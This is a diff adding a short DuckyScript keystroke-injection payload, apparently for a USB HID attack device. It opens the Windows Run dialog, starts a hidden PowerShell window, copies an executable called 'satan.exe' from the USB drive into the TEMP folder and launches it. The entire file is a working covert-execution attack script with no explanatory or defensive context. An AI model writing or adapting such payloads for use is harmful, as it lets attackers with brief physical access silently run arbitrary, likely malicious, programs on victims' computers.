@@ -1,0 +1,20 @@
+REM Wait for system to be ready
+DELAY 3000
+
+REM Open Run dialog
+GUI r
+DELAY 500
+
+REM Open PowerShell silently
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 800
+
+REM Copy satan.exe from USB (E:) to TEMP folder
+STRING Copy-Item -Path "E:\satan.exe" -Destination "$env:TEMP\satan.exe"
+ENTER
+DELAY 500
+
+REM Run satan.exe from TEMP
+STRING Start-Process "$env:TEMP\satan.exe"
+ENTER
